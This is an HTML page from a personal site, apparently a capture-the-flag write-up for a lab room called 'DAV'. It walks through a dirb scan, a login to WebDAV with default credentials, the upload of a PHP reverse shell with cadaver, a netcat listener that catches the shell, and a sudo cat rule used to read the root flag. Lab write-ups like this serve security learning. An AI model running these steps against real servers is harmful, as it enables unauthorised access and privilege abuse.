@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF DAV — Write-Up</title>
+    <link rel="stylesheet" href="Writeups.css">
+    <link rel="stylesheet" href="../styles.css">
+</head>
+
+<body>
+
+<div class="sidebar">
+    <h2>~/home</h2>
+    <a href="../index.html">Home</a>
+    <a href="../about.html">About Me</a>
+    <a href="../projects.html">Projects</a>
+    <a href="../writeups.html" class="active">Write-Ups</a>
+    <a href="../contact.html">Contact</a>
+
+    <div class="social-icons">
+        <a href="https://www.linkedin.com/in/iustin-barbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/linkedin.svg" alt="LinkedIn">
+        </a>
+        <a href="https://github.com/IustinBarbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/github.svg" alt="GitHub">
+        </a>
+        <a href="https://tryhackme.com/p/Glitch21" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/tryhackme.svg" alt="TryHackMe">
+        </a>
+    </div>
+</div>
+
+<section id="writeup-container">
+    <div class="writeup-content">
+        <h1>DAV</h1>
+
+        <p>For this room, nmap scan showed that there is only one port up - 80 http.</p>
+
+        <p>The website does not look like a normal web app, it is Apache2 Ubuntu Default Page.</p>
+
+        <p>However, I ran a dirb scan to find hidden directories, and I found something:</p>
+        <pre><code>┌──(glitch㉿Kali)-[~]
+└─$ dirb http://10.10.74.119 /usr/share/wordlists/dirb/small.txt 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Oct 26 13:38:38 2025
+URL_BASE: http://10.10.74.119/
+WORDLIST_FILES: /usr/share/wordlists/dirb/small.txt
+
+-----------------
+
+GENERATED WORDS: 959                                                           
+
+---- Scanning URL: http://10.10.74.119/ ----
++ http://10.10.74.119/webdav (CODE:401|SIZE:459)                                         
+
+-----------------
+END_TIME: Sun Oct 26 13:39:50 2025
+DOWNLOADED: 959 - FOUND: 1</code></pre>
+
+        <p>Webdav. I think I have heard about this before, and if I am not mistaken, this is a vulnerable service.</p>
+
+        <p>If I recall correctly, webdav was given as an example by the professor when I was preparing for the eJPT cert.</p>
+
+        <p>Searching for webdav on msfconsole gave me 60 results. So I was right, it is pretty known. Now, which one is the good one..</p>
+
+        <p>Looking for exploits, I found out that there are some default credentials for webdav:</p>
+        <pre><code>wampp
+xampp</code></pre>
+
+        <p>Here, in the <code>passwd.dav</code> file there is:</p>
+        <pre><code>wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91</code></pre>
+
+        <p>I don't think this is very useful, but I found a reverse shell payload from Pentestmonkey:</p>
+        <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank">php-reverse-shell.php</a>
+
+        <p>Used cadaver to put the payload:</p>
+        <pre><code>└─$ cadaver http://10.10.164.24/webdav
+Authentication required for webdav on server `10.10.164.24':
+Username: wampp
+Password: 
+dav:/webdav/> put reverse.php
+Uploading reverse.php to `/webdav/reverse.php':
+Progress: [=============================>] 100.0% of 5488 bytes succeeded.
+dav:/webdav/> </code></pre>
+
+        <p>And executed it on browser, while having nc listener on:</p>
+        <pre><code>└─$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.9.3.37] from (UNKNOWN) [10.10.164.24] 48010
+Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 07:32:19 up 31 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ </code></pre>
+
+        <p>Converted to tty shell:</p>
+        <pre><code>$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@ubuntu:/$ </code></pre>
+
+        <p>Found the flag using:</p>
+        <pre><code>find / -type f -name user.txt 2>>/dev/null</code></pre>
+
+        <p>And cat it out:</p>
+        <pre><code>www-data@ubuntu:/$ cat /home/merlin/user.txt</code></pre>
+
+        <p>Now that we have the user flag, let's check permissions:</p>
+        <pre><code>www-data@ubuntu:/$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /bin/cat
+www-data@ubuntu:/$ </code></pre>
+
+        <p>Well, since we can run cat, we don't need to do anything to escalate privileges, just cat out the root flag. Going to assume the root flag is in the root directory, as usual:</p>
+        <pre><code>www-data@ubuntu:/$ sudo cat /root/root.txt</code></pre>
+
+        <p>And just like that the flag is there.</p>
+
+    </div>
+</section>
+
+</body>
+</html>
